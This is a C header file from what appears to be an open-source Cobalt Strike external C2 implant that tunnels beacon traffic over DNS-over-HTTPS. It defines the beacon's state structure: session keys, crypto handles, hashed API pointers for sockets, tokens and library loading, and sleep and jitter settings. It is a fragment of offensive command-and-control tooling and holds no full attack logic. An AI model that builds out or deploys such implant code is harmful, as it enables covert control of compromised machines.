/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <limits.h>

#include "macros.h"
#include "hashes.h"
#include "apidef.h"

typedef struct
{
	BOOL	IsOnline;

	struct
	{
		ULONG BeaconId;
		ULONG LastTask;
		PVOID Socket;
		UCHAR BeaconKeys[16];
	} ctx;

	struct
	{
		PVOID Ptr;
		ULONG Len;
		HCRYPTKEY Key;
		HCRYPTPROV Provider;
	} key[ 4 ];

	struct
	{
		FUNC( recv );
		FUNC( send );
		FUNC( wcslen );
		FUNC( GetACP );
		FUNC( wcsrchr );
		FUNC( SleepEx );
		FUNC( wcstombs );
		FUNC( GetOEMCP );
		FUNC( LocalLock );
		FUNC( LocalFree );
		FUNC( LocalSize );
		FUNC( LocalAlloc );
		FUNC( WSAStartup );
		FUNC( WSAConnect );
		FUNC( WSACleanup );
		FUNC( WSASocketA );
		FUNC( closesocket );
		FUNC( RtlRandomEx );
		FUNC( CloseHandle );
		FUNC( FreeLibrary );
		FUNC( LocalUnlock );
		FUNC( LocalReAlloc );
		FUNC( LoadLibraryA );
		FUNC( GetTickCount );
		FUNC( CryptDecrypt );
		FUNC( CryptEncrypt );
		FUNC( CryptHashData );
		FUNC( CryptGenRandom );
		FUNC( CryptImportKey );
		FUNC( CryptCreateHash );
		FUNC( CryptDestroyKey );
		FUNC( OpenThreadToken );
		FUNC( OpenProcessToken );
		FUNC( CryptDestroyHash );
		FUNC( GetComputerNameA );
		FUNC( CryptSetKeyParam );
		FUNC( CryptSetHashParam );
		FUNC( CryptGetHashParam );
		FUNC( LookupAccountSidA );
		FUNC( CryptDecodeObjectEx );
		FUNC( GetCurrentProcessId );
		FUNC( GetTokenInformation );
		FUNC( CryptReleaseContext );
		FUNC( CryptAcquireContextA );
		FUNC( CryptImportPublicKeyInfo );
	} api;

	struct
	{
		ULONG Jitter;
		ULONG SleepTime;
	} setting;

	PVOID	Module[ 3 ];
	SOCKET	Socket;
} BEACON_INSTANCE, *PBEACON_INSTANCE;

#include "beacon_core.h"
#include "beacon_task.h"
#include "crypt/hmac.h"
#include "crypt/rsa.h"
#include "crypt/aes.h"
#include "transport.h"
#include "random.h"
#include "sha256.h"
#include "tebpeb.h"
#include "buffer.h"
#include "hash.h"
#include "peb.h"
#include "pe.h"
